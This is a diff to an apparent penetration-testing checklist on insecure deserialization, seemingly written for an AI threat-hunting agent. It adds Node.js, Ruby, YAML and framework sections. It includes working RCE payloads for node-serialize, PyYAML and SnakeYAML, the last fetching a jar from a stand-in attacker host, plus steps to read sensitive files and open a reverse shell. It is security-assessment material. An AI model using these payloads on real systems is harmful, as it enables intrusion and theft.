@@ -70,14 +70,37 @@ origin: AI Threat Hunting
       `ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c id"`
 - [ ] Test TypeNameHandling in Json.NET: `"$type":` property injection
 
-### 6. Impact Validation
+### 6. Node.js
+
+- [ ] Identify `node-serialize`, `serialize-javascript`, or `funcster` usage
+- [ ] Test `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}` for node-serialize
+- [ ] Check if `JSON.parse` input flows into `eval`, `Function()`, or `vm.runInContext`
+
+### 7. Ruby
+
+- [ ] Identify `Marshal.load`, `YAML.load` (without `safe_load`), or `Oj.load` usage
+- [ ] Markers: `\x04\x08` (Marshal magic bytes)
+- [ ] Generate payloads via universal-rce-ruby or craft `Marshal.dump` with ERB template gadgets
+- [ ] Check Rails `cookies.signed` / `cookies.encrypted` for Marshal-based session stores
+
+### 8. YAML Deserialization
+
+- [ ] Python PyYAML `yaml.load()` without `Loader=SafeLoader`:
+      `!!python/object/apply:os.system ['id']`
+- [ ] Ruby Psych `YAML.load()`:
+      `!!ruby/object:Gem::Installer\ni: x`
+- [ ] Java SnakeYAML:
+      `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/exploit.jar"]]]]`
+- [ ] .NET YamlDotNet: generally safe, but check custom type converters
+
+### 9. Impact Validation
 
 - [ ] Confirm code execution with `id`, `whoami`, or DNS callback
 - [ ] Read sensitive files
 - [ ] Establish reverse shell if in scope
 - [ ] Check if deserialized data affects application logic (role, permissions)
 
-### 7. Data Tampering (Non-RCE)
+### 10. Data Tampering (Non-RCE)
 
 - [ ] Modify user role/privilege in serialized session
 - [ ] Change object references to access other users' data
@@ -93,7 +116,14 @@ origin: AI Threat Hunting
 - Severity: Critical (RCE) or High (data tampering)
 - Remediation: avoid native deserialization, use allowlists, sign serialized data
 
+### 11. Framework-Specific Deserialization Checks
+
+- [ ] **Django**: Check for `pickle` in cache backend or session serializer
+- [ ] **Rails**: Check `Marshal.load` usage, test `cookies_serializer` config (should be `:json`)
+- [ ] **Express**: Check for `cookie-session` with unsigned cookies
+- [ ] **Spring**: Check for `DefaultSerializer` in session persistence, test RememberMe tokens
+- [ ] **Laravel**: Check encrypted cookie handling, `APP_KEY` rotation issues
+
 ## Extended Resources
 
 - `agent/references/payloads/deserialization-payloads.md` — Java (ysoserial), PHP, Python (pickle), Node.js, .NET
-- `agent/references/vuln-checklists/A08-integrity-failures.md` — OWASP Top 10:2025 software and data integrity failures
